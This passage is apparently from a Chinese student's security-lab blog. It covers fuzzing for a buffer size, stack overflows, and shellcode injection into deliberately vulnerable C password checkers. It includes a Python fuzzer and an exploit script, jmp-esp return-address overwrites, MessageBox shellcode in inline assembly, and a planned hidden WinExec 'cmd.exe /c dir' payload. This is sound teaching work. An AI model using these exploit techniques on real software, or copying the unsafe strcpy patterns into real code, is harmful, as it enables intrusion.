<p>首先通过 fuzz 计算 “缓冲区” 大小。每次向里填充一个字符，最终计算出我们需要填充字符的数量为 <code>11940</code> 比特。在填充满之前，会引发右图所示错误，注意到其中有提示 <code>"ESP was not properly saved"</code>，说明 ESP 可能被覆盖掉了</p>
 <details class="note default no-icon"><summary><p>fuzz 源码</p>
</summary>
<figure class="highlight python"><figcaption><span>fuzz.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">rpwd = <span class="string">"Congratulation! You have passed the verification!\n"</span></span><br><span class="line">wpwd = <span class="string">"incorrect password!\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(<span class="string">"a"</span>*num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_output</span>():</span><br><span class="line">    p=os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(p.readlines())</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_output</span>(<span class="params">output</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> output <span class="keyword">in</span> (rpwd,wpwd)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz</span>():</span><br><span class="line">    i = <span class="number">100</span></span><br><span class="line">    breakout_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">20000</span>,<span class="number">100</span>):</span><br><span class="line">        write_file(i)</span><br><span class="line">        <span class="keyword">if</span> is_valid_output(get_output()):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">"[+] Writing {} letters to password.txt"</span>.<span class="built_in">format</span>(i)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i-<span class="number">100</span>,i,<span class="number">10</span>):</span><br><span class="line">                write_file(j)</span><br><span class="line">                <span class="keyword">if</span> is_valid_output(get_output()):</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">"[+] Writing {} letters to password.txt"</span>.<span class="built_in">format</span>(j)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j-<span class="number">10</span>,j+<span class="number">1</span>):</span><br><span class="line">                        write_file(k)</span><br><span class="line">                        <span class="keyword">if</span> is_valid_output(get_output()):</span><br><span class="line">                            <span class="built_in">print</span> <span class="string">"[+] Writing {} letters to password.txt"</span>.<span class="built_in">format</span>(k)</span><br><span class="line">                            breakout_num=k</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            breakout_num=k</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[*] The program broke up after %d bytes of 'a's."</span>%breakout_num</span><br></pre></td></tr></tbody></table></figure>

</details> 
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-4.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-9.png" class=""></div></div></div>
</li>
<li>
<p>还有一个缓冲区？通过 ollydbg 调试可以看到在检验密码的函数中有一个 <code>MOV,EAX 2EE4</code> 操作，中间取了 <code>[EBP-2EE4]</code> 的有效地址，后面还有一个 <code>ADD,ESP 2EE4</code> 操作，可以推断这是再开辟另一块缓冲区，大小为十进制的 <code>12004</code> 字节。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-7.png" class=""></p>
</li>
<li>
<p>此时 EBP 的值为 <code>0x35f20</code>。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-8.png" class=""></p>
</li>
<li>
<p>我们输入的 “密码” 被复制到了 <code>0x3307c</code> 开头的地址上。<code>0x35f20-0x3307c=11940</code>(10 进制)，与之前 fuzz 结果相同，说明 <code>11940</code> 字节一旦占满，程序就会崩溃</p>
 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-6.png" class="">
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-10.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-11.png" class=""></div></div></div>
</li>
<li>
<p>上图是当 <code>11940</code> 个 <code>"a"</code> 被复制时，栈上的情况。可以看到 <code>0x35f20</code> 中的末两位被 <code>11940</code> 个 <code>"a"</code> 字符串的末尾 <code>\0</code> 所占，导致返回地址错误，程序崩溃</p>
 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-12.png" class="">
</li>
<li>
<p>所以这个缓冲区的大小为 <code>11940-4（32位系统的ebp大小）=11936</code> 字节。一旦缓冲区大小被计算出来，就可以根据前几次作业中缓冲区溢出的知识来通过 “验证”。</p>
</li>
<li>
<p>这次仍然利用 <code>jmp esp</code> 地址 <code>77f8948b</code> 作为跳板</p>
 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-5.png" class="">
</li>
<li>
<p>Payload 最终格式为：填充物（11940 个 a 含 4 字节 ebp）+<code>jmp_esp</code> 地址 + shellcode (<code>jmp 00401147</code>) 。构造 password 文档如下</p>
</li>
</ol>
<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">final_leak</span>():</span><br><span class="line">    shellcode = <span class="string">"\xe9\x1a\xb2\x3c\x00\x90\x90\x90"</span></span><br><span class="line">    fill_in = <span class="string">"a"</span>*<span class="number">11940</span>+<span class="string">"b"</span>*<span class="number">4</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"password.txt"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(fill_in+jmp_esp+shellcode)</span><br></pre></td></tr></tbody></table></figure>
<div class="note warning"><ul>
<li>但是执行这个 shellcode 过后跳到了旁边的地址上，没有成功通过验证。只能在跳到 <code>esp</code> 地址后通过修改汇编以跳入验证成功语句中。</li>
<li>可能是指令在执行的过程中遇见了坏字符导致其在内存中的值发生了变化，致使执行不成功。</li>
<li>但是可以成功溢出，因为在调试的时候已经发现可以陷入内核中，从 jmp esp 地址中返回程序，shellcode 被成功解析了。</li>
</ul>
<img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-13.png" class=""></div>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a href="https://www.exploit-db.com/exploits/12853">Quick 'n Easy FTP Server Lite 3.1 - Denial of Service</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>实验</category>
        <category>软件安全</category>
        <category>漏洞</category>
        <category>拒绝服务</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcode 利用</title>
    <url>/2019/11/13/experiments/security/software/shellcode/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>理解 shellcode 注入原理，通过淹没静态地址和跳板两种方法实现 shellcode 代码植入，尝试修改汇编语句的 shellcode 实现修改标题等简单操作。</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<p>源码如下</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PASSWORD <span class="string">"1234567"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">{ </span><br><span class="line">   <span class="type">int</span> authenticated; </span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">44</span>]; </span><br><span class="line">   authenticated=<span class="built_in">strcmp</span>(password,PASSWORD); </span><br><span class="line">   <span class="built_in">strcpy</span>(buffer,password); <span class="comment">//overflowed here!</span></span><br><span class="line">   <span class="keyword">return</span> authenticated; </span><br><span class="line">} </span><br><span class="line">main()</span><br><span class="line">{ </span><br><span class="line">   <span class="type">int</span> valid_flag=<span class="number">0</span>; </span><br><span class="line">   <span class="type">char</span> password[<span class="number">1024</span>]; </span><br><span class="line">   FILE * fp; </span><br><span class="line">   LoadLibrary(<span class="string">"user32.dll"</span>); <span class="comment">//prepare for messagebox </span></span><br><span class="line">   <span class="keyword">if</span>(!(fp=fopen(<span class="string">"password.txt"</span>,<span class="string">"rw+"</span>)))</span><br><span class="line">   { </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">   } </span><br><span class="line">   <span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,password); </span><br><span class="line">   valid_flag = verify_password(password); </span><br><span class="line">   <span class="keyword">if</span>(valid_flag)</span><br><span class="line">   { </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"incorrect password!\n"</span>);</span><br><span class="line">   } </span><br><span class="line">   <span class="keyword">else</span> { </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>); </span><br><span class="line">   } </span><br><span class="line">   fclose(fp);</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
<p>整体来说，是从 <code>password.txt</code> 文件中读取内容，并进行验证。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/0-1.png" class="" title="密码正确"></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/0-2.png" class="" title="密码错误"></div></div></div>
<p>在 <code>strcpy</code> 处依然存在溢出漏洞。不过 <code>buffer</code> 的长度更长了，可以承载一些 shellcode。<code>User32.dll</code> 的载入可以让我们在注入 shellcode 时调用 <code>MessageBox</code> 函数。</p>
<h3 id="shellcode代码理解">shellcode 代码理解</h3>
<ol>
<li>
<p>由于涉及到了 <code>dll</code> 库的加载，我们打开源程序，用 dependency walker 分析 dll 依赖。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/2.png" class=""></div></div></div>
</li>
<li>
<p>查出 <code>kernel32.dll</code> 的实际基址地址为 <code>0x77e60000</code>，<code>ExitProcess</code> 的地址的入口点为 <code>0x01b0bb</code>，加起来就是 <code>ExitProcess</code> 的实际地址 <code>0x77e7b0bb</code>。这是 shellcode 代码中 <code>exitprocess</code> 地址的来源。</p>
</li>
<li>
<p>同样方法找出 <code>user32.dll</code> 的基址为 <code>0x77df0000</code>，<code>MessageBoxA</code> 的入口点为 <code>0x033d68</code>，相加得到 <code>MessageBoxA</code> 的实际地址为 <code>0x77e23d68</code>。这是 shellcode 代码中 <code>messageBoxA</code> 的地址来源。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/4.png" class=""></div></div></div> 
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/5.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/6.png" class=""></div></div></div> 
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/8.png" class=""></div></div></div>
</li>
<li>
<p>接下来调试 shellcode 代码。shellcode 源码如下</p>
 <figure class="highlight c"><figcaption><span>shellcode.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    <span class="type">char</span> dllbuf[<span class="number">11</span>] = <span class="string">"user32.dll"</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">    _asm{</span><br><span class="line">        sub sp,<span class="number">0x440</span></span><br><span class="line">        xor ebx,ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push <span class="number">0x74707562</span>		<span class="comment">//bupt</span></span><br><span class="line">        push <span class="number">0x74707562</span>		<span class="comment">//bupt</span></span><br><span class="line">   </span><br><span class="line">        mov eax,esp</span><br><span class="line">        push ebx</span><br><span class="line">        push eax</span><br><span class="line">        push eax</span><br><span class="line">        push ebx</span><br><span class="line">   </span><br><span class="line">        mov eax,<span class="number">0x77E23D68</span>	<span class="comment">//messageboxA  入口地址</span></span><br><span class="line">        call eax</span><br><span class="line">        push ebx</span><br><span class="line">        mov eax,<span class="number">0x77E7B0BB</span>	<span class="comment">//exitprocess  入口地址</span></span><br><span class="line">        call eax</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>运行该代码，发现程序弹出了一个含有 <code>"buptbupt"</code> 标题的对话框 <img data-src="/2019/11/13/experiments/security/software/shellcode/9.png" class=""> <img data-src="/2019/11/13/experiments/security/software/shellcode/10.png" class=""></p>
</li>
<li>
<p>用 ollydbg 打开 shellcode 程序，把我们写的汇编代码复制出来</p>
</li>
</ol>
<h3 id="淹没静态地址的shellcode注入">淹没静态地址的 shellcode 注入</h3>
<ol>
<li>用 ollydbg 打开 <code>overflow_exe.exe</code> 程序，在 <code>strcpy</code> 处下一个断点。 <img data-src="/2019/11/13/experiments/security/software/shellcode/11.png" class=""></li>
<li><code>strcpy</code> 将拷贝字符串到 <code>0x12faf0</code> 地址处，这也是我们将要放 shellcode 的地址。 <img data-src="/2019/11/13/experiments/security/software/shellcode/12.png" class=""></li>
<li>下面构造 payload，我们构造的形式类似于 Shellcode + <code>0x90</code> 若干 + shellcode 在缓冲区的起始地址，要注意逆序书写。Shellcode 的返回地址应当在 buff 的容量 + authenticated 变量空间 + ebp 之后，也就是第 53~56 字节处。综上，我们构造 payload 如下<img data-src="/2019/11/13/experiments/security/software/shellcode/13.png" class="">
</li>
<li>再运行程序，发现 <code>0x12faf0</code> 开始的空间已经覆盖为了我们所需要的样子。 <img data-src="/2019/11/13/experiments/security/software/shellcode/14.png" class=""></li>
<li>返回到 shellcode 地址后，其中所写的内容都作为代码执行了。 <img data-src="/2019/11/13/experiments/security/software/shellcode/15.png" class=""></li>
<li>当然也可以弹出对话框了，脱离 ollydbg 环境也可以成功。 <img data-src="/2019/11/13/experiments/security/software/shellcode/16.png" class=""> <img data-src="/2019/11/13/experiments/security/software/shellcode/17.png" class=""></li>
</ol>
<h3 id="利用跳板的shellcode注入">利用跳板的 shellcode 注入</h3>
<ol>
<li>仍在 <code>strcpy</code> 函数上设置断点，运行至其附近。</li>
<li>右键选择 overflow return address → ASCII overflow returns → search JMP/CALL ESP</li>
<li> 根据提示查看日志，发现有很多可以利用的地方。选择一条在 <code>user32.txt</code> 中的地址，<code>0x77e2e32a</code>。这个是 <code>jmp esp</code> 的地址。 <img data-src="/2019/11/13/experiments/security/software/shellcode/18.png" class=""> <img data-src="/2019/11/13/experiments/security/software/shellcode/19.png" class="">
</li>
<li>这次的 payload 形式为 52 字节填充物 + 4 字节 <code>JMP ESP</code> 地址（逆序） + shellcode (可选 + 若干 <code>0x90</code>)。 <div class="note info"><p>下图 payload 也可以成功弹框出来。但是程序没退出，后来发现 shellcode 中忘记调用 <code>ExitProcess</code> 函数，补上就更加完美了 <img data-src="/2019/11/13/experiments/security/software/shellcode/20.png" class=""> <img data-src="/2019/11/13/experiments/security/software/shellcode/21.png" class=""></p>
</div>
</li>
</ol>
<h3 id="修改汇编语句，改变弹窗标题">修改汇编语句，改变弹窗标题</h3>
<p>通过阅读汇编代码得知，这个 <code>"buptbupt"</code> 字符串实际上来自两个 push 操作，每次是 4 个字母。那么改变 push 的参数，我们也应该能对标题框的显示进行改变。</p>
<div class="note warning"><p>如果尝试输出中文，需要注意一个汉字由两个字节表示，push 输出时应该全部（字内和字间）逆序书写</p>
</div>
<h2 id="测试结论">测试结论</h2>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/IMG20191109132950.jpg" class="" title="淹没静态地址的shellcode注入示意"></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/IMG20191109134305.jpg" class="" title="利用跳板的shellcode注入示意"></div></div></div>
<h2 id="思考题">思考题</h2>
<div class="note warning"><p>本段文字并未完全完成实验，这里只是列出了部分思路。</p>
</div> 
<p>程序源代码如下</p>
<figure class="highlight c"><figcaption><span>stackOverrun.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  StackOverrun.c</span></span><br><span class="line"><span class="comment">  This program shows an example of how a stack-based</span></span><br><span class="line"><span class="comment">  buffer overrun can be used to execute arbitrary code.  Its</span></span><br><span class="line"><span class="comment">  objective is to find an input string that executes the function bar().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* input)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    LoadLibrary(<span class="string">"user32.dll"</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//What? No extra arguments supplied to printf?</span></span><br><span class="line">    <span class="comment">//It's a cheap trick to view the stack 8-)</span></span><br><span class="line">    <span class="comment">//We'll see this trick again when we look at format strings.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Pass the user input straight to secure code public enemy #1.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Augh! I've been hacked!\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//Blatant cheating to make life easier on myself</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Address of foo = %p\n"</span>, foo);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Address of bar = %p\n"</span>, bar);</span><br><span class="line"></span><br><span class="line">    foo(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这次的程序比上次多了 <code>LoadLibrary</code> 调用和 <code>Windows.h</code> 头文件，但大体逻辑没有变化。目标是通过 dir 命令将 C 盘根目录结构保存在 <code>shellcode.txt</code> 中。</p>
<ol>
<li>
<p>shellcode 需要利用系统调用 <code>CreateProcessA</code> 或 <code>WinExec</code>，这里选择 <code>WinExec("cmd.exe /c dir C:\\ &gt; shellcode.txt", SW_HIDE)</code>。</p>
<ul>
<li>其中 <code>SW_HIDE=0</code> 意味着隐藏窗口，更具隐蔽性</li>
</ul>
</li>
<li>
<p>首先找到 <code>WinExec</code> 的地址，还是打开 dependency walker 查看。 <img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-1.png" class=""></p>
<ul>
<li>通过计算可得 <code>WinExec</code> 的地址为 <code>kernel32.dll</code> 的基址加上 <code>WinExec</code> 的入口点地址，为 <code>0x77e78601</code>。</li>
<li>用同样的方法计算出 <code>ExitProcess</code> 的地址为 <code>0x77e7b0bb</code>。</li>
</ul>
</li>
<li>
<p>通过试运行程序得知，我们的命令行输入被存储在了 <code>0x12ff68</code> 开头的位置上。<code>bar</code> 的地址为 <code>0x401070</code>，<code>jmp esp</code> 后将从 <code>0x12ff78</code> 开始执行我们的 shellcode。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-3.png" class=""></div></div></div>
</li>
<li>
<p>扫描到了很多 <code>jmp esp</code> 的地址，本次选择 <code>0x77e2e32a</code> 中 <code>user32.text</code> 的地址作为跳板 <img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-4.png" class=""></p>
</li>
<li>
<p>首先，完成前半部分的填充和 <code>bar</code> 函数调用。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-6.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-7.png" class=""></div></div></div>
</li>
<li>
<p>把我们的所有操作写成一个 c 文件，编译，把生成的 exe 拿到 ollydbg 运行一遍，拿到我们的 shellcode。这是需要的操作部分：</p>
 <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> command[<span class="number">40</span>] = <span class="string">"cmd.exe /c dir C:\\&gt;shellcode.txt"</span>;</span><br><span class="line">WinExec(command, SW_HIDE);</span><br><span class="line">ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure>
</li>
</ol>
<div class="note warning"><p>表面上看非常不错，但这样的字符串是在 rdata 段里的，复制出来的操作码取的就是内存中的相对值，所以只能靠 push 推入。<br>
<img data-src="/2019/11/13/experiments/security/software/shellcode/%E6%80%9D%E8%80%83%E9%A2%98-8.png" class=""><br>
把 <code>command</code> 数组写成一个一个字符分开的模式，末尾的 <code>\x00</code> 要手动加上。目前的问题停留在了栈上字符串的构造上。</p>
</div>
]]></content>
      <categories>
        <category>实验</category>
        <category>软件安全</category>
        <category>漏洞</category>
        <category>shellcode注入</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出</title>
    <url>/2019/10/26/experiments/security/software/stackOverflow/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>学会使用淹没相邻变量或返回地址的方法利用缓冲区溢出漏洞。</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<p>本次实验的源码如下所示</p>
<figure class="highlight c"><figcaption><span>stackvar.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">"1234567"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];<span class="comment">// add local buff</span></span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,password);<span class="comment">//overflowed here!</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"please input password:       "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line">		valid_flag = verify_password(password);</span><br><span class="line">		<span class="keyword">if</span>(valid_flag)</span><br><span class="line">		{</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		{</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="验证缓冲区溢出的发生">验证缓冲区溢出的发生</h3>
<ol>
<li>正常情况下，输入正确密码，程序提示 “输入正确”；输入错误密码（少于 8 位），程序提示 “输入错误”。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/1.png" class=""></li>
<li>进入 ollydbg，在函数调用处打断点。开始运行程序，输入一个较短的密码，就以 <code>"444"</code> 为例。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/2.png" class=""></li>
<li><code>strcpy</code> 的调用点在 <code>0x401055</code> 处。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/3.png" class=""></li>
<li>输入的密码存储在 <code>0x12fb7c</code> 处，要拷贝到 <code>0x12fb18</code> 处。<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/4.png" class="" title="from"></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/5.png" class="" title="to"></div></div></div>
</li>
<li><code>0x12fb18</code> 处的数据如下，显示为 <code>00 34 34 34</code>，恰好是 <code>"4"</code> 的 ascii 码十六进制表示 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/5%E8%A1%A5.png" class=""></li>
</ol>
<h3 id="淹没相邻变量改变程序流程">淹没相邻变量改变程序流程</h3>
<div class="tabs" id="overflow2"><ul class="nav-tabs"><li class="tab active"><a href="#overflow2-1">输入 qqqqqqqqrst</a></li><li class="tab"><a href="#overflow2-2">输入 qqqqqqqq</a></li><li class="tab"><a href="#overflow2-3">输入 01234567</a></li></ul><div class="tab-content"><div class="tab-pane active" id="overflow2-1"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/6.png" class=""> 
拷贝前后，内存的变化如下 
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/7.png" class="" title="前"></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/8.png" class="" title="后"></div></div></div> 
<div class="note info no-icon"><p>已经观察到 <code>0x12fb20</code> 位置的变量被覆盖了<br>
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/9.png" class=""></p>
</div></div><div class="tab-pane" id="overflow2-2"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/10.png" class=""> 
拷贝前后，内存变化如下 
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/11.png" class="" title="前"></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/12.png" class="" title="后"></div></div></div> 
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/13.png" class="">
<div class="note info no-icon"><p><code>0x12fb20</code> 的值被覆盖成了 <code>0x00000000</code>。导致函数返回值为零，认证通过。<br>
